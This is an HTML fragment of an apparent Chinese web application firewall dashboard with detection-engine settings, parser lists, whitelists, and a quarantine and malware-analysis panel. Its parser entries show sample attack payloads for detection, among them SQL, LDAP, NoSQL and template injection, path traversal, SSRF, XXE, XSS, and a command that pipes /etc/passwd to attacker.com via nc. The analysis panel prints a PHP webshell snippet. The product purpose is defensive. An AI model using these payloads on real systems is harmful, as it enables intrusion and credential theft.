          <div class="kpi-top"><div class="kpi-icon">📊</div><span class="kpi-trend up">+12%</span></div>
          <div class="kpi-value" id="semanticDaily">12,847</div>
          <div class="kpi-label">日均分析请求</div>
          <div class="kpi-sub">近 7 日平均</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3);--icon-bg:rgba(16,185,129,.15)">
          <div class="kpi-top"><div class="kpi-icon">🎯</div><span class="kpi-trend down">-0.1%</span></div>
          <div class="kpi-value">98.7%</div>
          <div class="kpi-label">检测准确率</div>
          <div class="kpi-sub">基于机器学习模型</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-4);--icon-bg:rgba(239,68,68,.15)">
          <div class="kpi-top"><div class="kpi-icon">⚠️</div><span class="kpi-trend down">-5%</span></div>
          <div class="kpi-value">0.3%</div>
          <div class="kpi-label">误报率</div>
          <div class="kpi-sub">7 层误报控制</div>
        </div>
      </div>

      <!-- 引擎总控卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>引擎总控</div>
        </div>
        <div style="padding:4px 0">
          <!-- 全局开关 -->
          <div class="big-switch-wrap">
            <div class="big-switch-label">
              <h4>语义引擎全局开关</h4>
              <p>开启后启用全部语义分析能力，包括注入检测、XSS 解析、代码执行分析等</p>
            </div>
            <div class="big-switch on" id="semanticMainSwitch" onclick="toggleSemanticMain()"></div>
          </div>

          <div class="two-col-grid">
            <!-- 灵敏度调节 -->
            <div>
              <div class="card-head" style="margin-bottom:8px">
                <div class="card-title" style="font-size:12px"><span class="dot" style="background:var(--purple)"></span>灵敏度调节</div>
              </div>
              <div class="slider-wrap">
                <div class="slider-label">
                  <span>当前灵敏度</span>
                  <span class="value" id="sensitivityValue">中</span>
                </div>
                <input type="range" class="semantic-slider" id="sensitivitySlider" min="1" max="4" value="2" oninput="updateSensitivity(this.value)">
                <div class="slider-steps">
                  <span>低</span><span>中</span><span>高</span><span>极高</span>
                </div>
              </div>
            </div>

            <!-- 性能模式 -->
            <div>
              <div class="card-head" style="margin-bottom:8px">
                <div class="card-title" style="font-size:12px"><span class="dot" style="background:var(--orange)"></span>性能模式</div>
              </div>
              <div class="mode-selector">
                <div class="mode-btn" onclick="setPerfMode('speed')" id="perfSpeed">性能优先</div>
                <div class="mode-btn active" onclick="setPerfMode('balance')" id="perfBalance">平衡</div>
                <div class="mode-btn" onclick="setPerfMode('accuracy')" id="perfAccuracy">精度优先</div>
              </div>
            </div>
          </div>

          <!-- 自动学习开关 -->
          <div style="margin-top:16px;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:rgba(148,163,184,.04);border-radius:12px;border:1px solid var(--border)">
            <div>
              <div style="font-size:13px;font-weight:600;margin-bottom:2px">自动学习</div>
              <div style="font-size:11px;color:var(--text3)">自动从误报反馈中学习，持续优化检测模型</div>
            </div>
            <div class="big-switch" style="width:48px;height:26px" id="autoLearnSwitch" onclick="toggleAutoLearn()"></div>
          </div>
        </div>
      </div>

      <!-- 解析器管理 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--purple)"></span>解析器管理</div>
          <div><span class="tag cyan" id="parserEnabledCount">18/20 已启用</span></div>
        </div>

        <div class="semantic-tabs" id="parserTabs">
          <div class="semantic-tab active" data-cat="inject">注入类</div>
          <div class="semantic-tab" data-cat="include">包含类</div>
          <div class="semantic-tab" data-cat="xss">注入类(XSS等)</div>
          <div class="semantic-tab" data-cat="code">代码类</div>
          <div class="semantic-tab" data-cat="business">业务类</div>
        </div>

        <div id="parserContent">
          <!-- 注入类 -->
          <div class="parser-list" data-cat="inject">
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">SQL 语义解析</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>12 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>286 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.28%</span></div>
                <div class="parser-payload">示例: ?id=1' OR '1'='1 UNION SELECT username,password FROM users--</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">命令注入解析</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>8 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>152 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.35%</span></div>
                <div class="parser-payload">示例: ?cmd=ls; cat /etc/passwd | nc attacker.com 4444</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">代码执行解析</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>10 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>198 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.42%</span></div>
                <div class="parser-payload">示例: ?code=eval('phpinfo()');assert($_POST['cmd']);</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">LDAP 注入</div>
                <span class="tag orange">中危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>6 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>68 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.15%</span></div>
                <div class="parser-payload">示例: ?user=admin)(|(password=*))</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">XPath 注入</div>
                <span class="tag orange">中危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>6 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>72 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.18%</span></div>
                <div class="parser-payload">示例: ?path=//user[@id='1' or '1'='1']/password</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">NoSQL 注入</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>9 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>124 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.31%</span></div>
                <div class="parser-payload">示例: ?user[$ne]=test&pass[$gt]=</div>
              </div>
            </div>
          </div>

          <!-- 包含类 -->
          <div class="parser-list" data-cat="include" style="display:none">
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">文件包含解析</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>7 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>96 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.22%</span></div>
                <div class="parser-payload">示例: ?page=../../../../etc/passwd</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">路径遍历解析</div>
                <span class="tag orange">中危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>5 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>84 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.19%</span></div>
                <div class="parser-payload">示例: ?file=../../../etc/shadow%00</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">SSRF 语义解析</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>8 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>108 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.25%</span></div>
                <div class="parser-payload">示例: ?url=http://169.254.169.254/latest/meta-data/</div>
              </div>
            </div>
          </div>

          <!-- XSS等 -->
          <div class="parser-list" data-cat="xss" style="display:none">
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">XSS 语义解析</div>
                <span class="tag orange">中危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>10 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>215 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.38%</span></div>
                <div class="parser-payload">示例: ?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">HTML 解析</div>
                <span class="tag yellow">低危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>6 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>76 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.12%</span></div>
                <div class="parser-payload">示例: ?content=&lt;iframe src=evil.com onload=alert(1)&gt;</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">CRLF 注入解析</div>
                <span class="tag yellow">低危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>4 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>42 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.08%</span></div>
                <div class="parser-payload">示例: ?url=%0d%0aSet-Cookie:session=hacked</div>
              </div>
            </div>
          </div>

          <!-- 代码类 -->
          <div class="parser-list" data-cat="code" style="display:none">
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">PHP 代码语义</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>11 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>186 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.33%</span></div>
                <div class="parser-payload">示例: ?code=${eval($_GET[cmd])}</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">反序列化解析</div>
                <span class="tag red">高危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>7 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>92 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.21%</span></div>
                <div class="parser-payload">示例: ?data=O:8:"stdClass":1:{s:5:"test";s:5:"evil";}</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">SSTI 模板注入</div>
                <span class="tag orange">中危</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>8 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>104 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.27%</span></div>
                <div class="parser-payload">示例: ?name={{7*7}} 或 ${7*7} 或 &lt;%= 7*7 %&gt;</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">XXE 实体解析</div>
                <span class="tag orange">中危</span>
                <div class="big-switch" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>6 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>58 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.14%</span></div>
                <div class="parser-payload">示例: &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</div>
              </div>
            </div>
          </div>

          <!-- 业务类 -->
          <div class="parser-list" data-cat="business" style="display:none">
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">业务语义分析</div>
                <span class="tag blue">业务</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>15 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>168 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.45%</span></div>
                <div class="parser-payload">示例: 异常参数顺序、非常规业务流程跳转</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">参数语义识别</div>
                <span class="tag blue">业务</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>9 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>112 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.32%</span></div>
                <div class="parser-payload">示例: 参数类型异常、取值范围越界</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">攻击链分析</div>
                <span class="tag purple">高级</span>
                <div class="big-switch on" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>20 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>256 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.52%</span></div>
                <div class="parser-payload">示例: 探测→注入→提权 多阶段攻击关联分析</div>
              </div>
            </div>
            <div class="parser-item">
              <div class="parser-head">
                <div class="parser-name">意图推断</div>
                <span class="tag purple">高级</span>
                <div class="big-switch" style="width:44px;height:24px" onclick="toggleParser(this)"></div>
              </div>
              <button class="btn btn-ghost" style="padding:4px 10px;font-size:11px;width:100%" onclick="toggleParserDetail(this)">详情 ▾</button>
              <div class="parser-detail">
                <div class="parser-detail-row"><span>检测维度</span><span>18 维</span></div>
                <div class="parser-detail-row"><span>匹配规则数</span><span>196 条</span></div>
                <div class="parser-detail-row"><span>误报率</span><span>0.58%</span></div>
                <div class="parser-payload">示例: 基于行为序列的攻击意图预测</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- 误报控制 + 混淆检测 -->
      <div class="chart-row two">
        <!-- 误报控制卡片 -->
        <div class="table-card">
          <div class="card-head">
            <div class="card-title"><span class="dot" style="background:var(--green)"></span>误报控制</div>
          </div>
          <div style="padding:8px 0">
            <div class="stat-inline">
              <span class="stat-label">白名单总数</span>
              <span class="stat-val" id="wlTotalCount">128</span>
            </div>
            <div class="stat-inline">
              <span class="stat-label">URL 白名单</span>
              <span class="stat-val" id="wlUrlCount">42</span>
            </div>
            <div class="stat-inline">
              <span class="stat-label">参数白名单</span>
              <span class="stat-val" id="wlParamCount">68</span>
            </div>
            <div class="stat-inline">
              <span class="stat-label">规则豁免</span>
              <span class="stat-val" id="wlRuleCount">18</span>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-top:14px">
              <button class="btn btn-primary" onclick="openWlModal('url')">URL 白名单</button>
              <button class="btn" onclick="openWlModal('param')">参数白名单</button>
              <button class="btn btn-ghost" onclick="openWlModal('rule')">规则豁免</button>
            </div>
          </div>
        </div>

        <!-- 混淆检测能力卡片 -->
        <div class="table-card">
          <div class="card-head">
            <div class="card-title"><span class="dot" style="background:var(--pink)"></span>混淆检测能力</div>
            <div><span class="tag purple">14 层解码</span></div>
          </div>
          <div style="padding:4px 0">
            <div class="stat-inline">
              <span class="stat-label">支持混淆类型</span>
              <span class="stat-val" style="color:var(--green)">12 种</span>
            </div>
            <div class="stat-inline">
              <span class="stat-label">解码深度</span>
              <span class="stat-val" style="color:var(--cyan)">14 层</span>
            </div>
            <div class="confusion-grid">
              <div class="confusion-item supported">Base64</div>
              <div class="confusion-item supported">URL编码</div>
              <div class="confusion-item supported">Unicode</div>
              <div class="confusion-item supported">HTML实体</div>
              <div class="confusion-item supported">Hex编码</div>
              <div class="confusion-item supported">Octal</div>
              <div class="confusion-item supported">JSFuck</div>
              <div class="confusion-item supported">AAEncode</div>
              <div class="confusion-item supported">GZIP</div>
              <div class="confusion-item supported">双重编码</div>
              <div class="confusion-item supported">变异编码</div>
              <div class="confusion-item supported">自定义混淆</div>
            </div>
            <div style="margin-top:14px;background:rgba(148,163,184,.04);border-radius:10px;padding:12px;border:1px solid var(--border)">
              <div style="font-size:12px;color:var(--text2);margin-bottom:8px">混淆样本检测趋势</div>
              <div style="height:100px;display:flex;align-items:end;gap:4px">
                <div style="flex:1;background:linear-gradient(180deg,rgba(236,72,153,.6),rgba(236,72,153,.2));border-radius:4px 4px 0 0;height:45%"></div>
                <div style="flex:1;background:linear-gradient(180deg,rgba(139,92,246,.6),rgba(139,92,246,.2));border-radius:4px 4px 0 0;height:62%"></div>
                <div style="flex:1;background:linear-gradient(180deg,rgba(6,182,212,.6),rgba(6,182,212,.2));border-radius:4px 4px 0 0;height:55%"></div>
                <div style="flex:1;background:linear-gradient(180deg,rgba(16,185,129,.6),rgba(16,185,129,.2));border-radius:4px 4px 0 0;height:78%"></div>
                <div style="flex:1;background:linear-gradient(180deg,rgba(245,158,11,.6),rgba(245,158,11,.2));border-radius:4px 4px 0 0;height:68%"></div>
                <div style="flex:1;background:linear-gradient(180deg,rgba(239,68,68,.6),rgba(239,68,68,.2));border-radius:4px 4px 0 0;height:85%"></div>
                <div style="flex:1;background:linear-gradient(180deg,rgba(59,130,246,.6),rgba(59,130,246,.2));border-radius:4px 4px 0 0;height:72%"></div>
              </div>
              <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--text4);margin-top:6px">
                <span>周一</span><span>周二</span><span>周三</span><span>周四</span><span>周五</span><span>周六</span><span>周日</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- 白名单弹窗 -->
    <div class="modal-overlay" id="wlModal">
      <div class="modal-box">
        <div class="modal-head">
          <h4 id="wlModalTitle">白名单管理</h4>
          <span class="modal-close" onclick="closeWlModal()">✕</span>
        </div>
        <div class="modal-body">
          <div class="wl-add-row">
            <input type="text" id="wlInput" placeholder="输入白名单项...">
            <button class="btn btn-primary" onclick="addWlItem()">添加</button>
          </div>
          <div id="wlList"></div>
        </div>
        <div class="modal-foot">
          <button class="btn btn-ghost" onclick="closeWlModal()">关闭</button>
        </div>
      </div>
    </div>

    <!-- ===== 沙箱中心 ===== -->
    <div class="page" id="page-sandbox">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-4)"><div class="kpi-value" id="sandMal">0</div><div class="kpi-label">检测到恶意文件</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-3)"><div class="kpi-value" id="sandClean">0</div><div class="kpi-label">已清除文件</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-1)"><div class="kpi-value" id="sandWatch">0</div><div class="kpi-label">监控文件数</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-2)"><div class="kpi-value" id="sandQuar">0</div><div class="kpi-label">隔离区文件</div></div>
      </div>

      <!-- 基线状态与控制 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>基线状态与工作模式</div>
          <div>
            <button class="btn btn-primary" id="btnLockBaseline" onclick="lockBaseline()">🔒 锁定基线</button>
            <button class="btn" id="btnUnlockBaseline" onclick="unlockBaseline()" style="margin-left:8px">🔓 解锁基线</button>
            <button class="btn" id="btnScanNow" onclick="scanNow()" style="margin-left:8px">🔍 立即扫描</button>
          </div>
        </div>
        <table>
          <thead><tr><th>项目</th><th>当前值</th><th>说明</th></tr></thead>
          <tbody>
            <tr><td>工作模式</td><td><span class="tag yellow" id="sandMode">learning</span></td><td>learning=只扫描 / protecting=秒删+精准切割</td></tr>
            <tr><td>基线锁定</td><td><span class="tag red" id="sandBaseLock">未锁定</span></td><td>必须锁定基线才能启动精准切割</td></tr>
            <tr><td>受保护文件</td><td><span class="tag cyan" id="sandBaseCount">0</span></td><td>基线锁定的干净文件数</td></tr>
            <tr><td>基线锁定时间</td><td><span id="sandBaseTime">-</span></td><td>最近一次锁定基线的时间</td></tr>
            <tr><td>AutoLearn 联动冻结</td><td><span class="tag yellow" id="sandAlFrozen">否</span></td><td>沙箱锁基线时自动冻结 AutoLearn（防"教坏"）</td></tr>
            <tr><td>联动开关</td><td><span id="sandCoupling">-</span></td><td>WAF_SANDBOX_LEARN_COUPLING</td></tr>
          </tbody>
        </table>
      </div>

      <!-- 隔离区文件列表（增强） -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--red)"></span>隔离区文件</div>
          <div style="display:flex;gap:8px;align-items:center">
            <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text3);cursor:pointer">
              <input type="checkbox" id="quarSelectAll" onchange="quarToggleSelectAll()" style="cursor:pointer"> 全选
            </label>
            <button class="btn btn-success" style="padding:4px 10px;font-size:11px" onclick="quarBatchRestore()">批量恢复</button>
            <button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="quarBatchDelete()">批量删除</button>
          </div>
        </div>
        <table>
          <thead><tr><th style="width:36px"><input type="checkbox" id="quarSelectAllHead" onchange="quarToggleSelectAll()" style="cursor:pointer"></th><th>文件路径</th><th>隔离时间</th><th>原因</th><th>威胁等级</th><th>操作</th></tr></thead>
          <tbody id="sandQuarTable"><tr><td colspan="6" style="text-align:center;color:var(--text4);padding:30px">加载中...</td></tr></tbody>
        </table>
      </div>

      <!-- 文件分析详情 -->
      <div class="table-card collapsible collapsed" id="fileAnalyzeCard">
        <div class="card-head" onclick="toggleCollapse('fileAnalyzeCard')">
          <div class="card-title"><span class="dot" style="background:var(--purple)"></span>📂 恶意文件分析</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div class="add-row">
            <input type="text" id="analyzeFilePath" placeholder="输入文件路径，如: /var/www/html/wp-content/plugins/bad.php" style="flex:1">
            <button class="btn btn-primary" onclick="analyzeFile()">🔍 分析</button>
          </div>
          <div id="analyzeResult" style="display:none">
            <div class="kpi-grid" style="grid-template-columns:repeat(4,1fr);margin-bottom:16px">
              <div class="kpi-card" style="padding:14px">
                <div class="kpi-label" style="font-size:11px">文件大小</div>
                <div class="kpi-value" style="font-size:20px;margin-top:4px" id="anaSize">45.2 KB</div>
              </div>
              <div class="kpi-card" style="padding:14px">
                <div class="kpi-label" style="font-size:11px">文件类型</div>
                <div class="kpi-value" style="font-size:20px;margin-top:4px" id="anaType">PHP</div>
              </div>
              <div class="kpi-card" style="padding:14px">
                <div class="kpi-label" style="font-size:11px">修改时间</div>
                <div class="kpi-value" style="font-size:14px;margin-top:4px" id="anaMtime">2024-01-15 14:32</div>
              </div>
              <div class="kpi-card" style="padding:14px">
                <div class="kpi-label" style="font-size:11px">威胁等级</div>
                <div class="kpi-value" style="font-size:20px;margin-top:4px;color:var(--red);-webkit-text-fill-color:var(--red)" id="anaLevel">高危</div>
              </div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
              <div style="padding:12px;background:rgba(0,0,0,.2);border-radius:10px">
                <div style="font-size:12px;color:var(--text3);margin-bottom:6px">MD5</div>
                <div style="font-family:monospace;font-size:11px;color:var(--text2)" id="anaMd5">a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</div>
              </div>
              <div style="padding:12px;background:rgba(0,0,0,.2);border-radius:10px">
                <div style="font-size:12px;color:var(--text3);margin-bottom:6px">SHA1</div>
                <div style="font-family:monospace;font-size:11px;color:var(--text2)" id="anaSha1">a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0</div>
              </div>
            </div>
            <div style="margin-bottom:16px">
              <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">检测命中规则</div>
              <table>
                <thead><tr><th>规则名称</th><th>威胁类型</th><th>匹配位置</th><th>置信度</th></tr></thead>
                <tbody id="anaRulesBody">
                  <tr><td style="font-family:monospace;font-size:11px">eval_base64_decode</td><td><span class="tag red">代码执行</span></td><td style="font-family:monospace;font-size:11px">第 23 行</td><td><span class="tag red">98%</span></td></tr>
                  <tr><td style="font-family:monospace;font-size:11px">webshell_assert</td><td><span class="tag red">WebShell</span></td><td style="font-family:monospace;font-size:11px">第 45 行</td><td><span class="tag red">95%</span></td></tr>
                  <tr><td style="font-family:monospace;font-size:11px">preg_replace_eval</td><td><span class="tag orange">代码执行</span></td><td style="font-family:monospace;font-size:11px">第 67 行</td><td><span class="tag orange">87%</span></td></tr>
                  <tr><td style="font-family:monospace;font-size:11px">backdoor_system</td><td><span class="tag red">命令执行</span></td><td style="font-family:monospace;font-size:11px">第 89 行</td><td><span class="tag red">92%</span></td></tr>
                  <tr><td style="font-family:monospace;font-size:11px">file_upload_rce</td><td><span class="tag orange">文件上传</span></td><td style="font-family:monospace;font-size:11px">第 112 行</td><td><span class="tag orange">78%</span></td></tr>
                  <tr><td style="font-family:monospace;font-size:11px">sql_injection_func</td><td><span class="tag yellow">SQL注入</span></td><td style="font-family:monospace;font-size:11px">第 134 行</td><td><span class="tag yellow">65%</span></td></tr>
                  <tr><td style="font-family:monospace;font-size:11px">xss_output</td><td><span class="tag yellow">XSS</span></td><td style="font-family:monospace;font-size:11px">第 156 行</td><td><span class="tag yellow">58%</span></td></tr>
                </tbody>
              </table>
            </div>
            <div>
              <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">可疑代码片段</div>
              <div style="background:rgba(0,0,0,.4);border-radius:10px;padding:14px;font-family:'JetBrains Mono','SF Mono',Consolas,monospace;font-size:12px;line-height:1.8;overflow-x:auto;max-height:300px;overflow-y:auto;border:1px solid var(--border)">
                <pre id="anaCodeSnippet" style="margin:0;color:var(--text2)"><span style="color:var(--text4)">21</span> <span style="color:#c084fc">$payload = $_POST['cmd'];</span>
<span style="color:var(--text4)">22</span> <span style="color:#f87171;background:rgba(239,68,68,.1);padding:2px 4px;border-radius:3px">$decoded = base64_decode($payload);</span>
<span style="color:var(--text4)">23</span> <span style="color:#f87171;background:rgba(239,68,68,.15);padding:2px 4px;border-radius:3px">eval($decoded);</span>
<span style="color:var(--text4)">24</span> <span style="color:var(--text3)">// Backdoor entry point</span>
<span style="color:var(--text4)">25</span>
<span style="color:var(--text4)">44</span> <span style="color:#c084fc">function shell_exec_cmd($cmd) {</span>
<span style="color:var(--text4)">45</span> <span style="color:#f87171;background:rgba(239,68,68,.15);padding:2px 4px;border-radius:3px">    assert($cmd);</span>
<span style="color:var(--text4)">46</span> <span style="color:var(--text2)">    return system($cmd);</span>
<span style="color:var(--text4)">47</span> <span style="color:#c084fc">}</span>
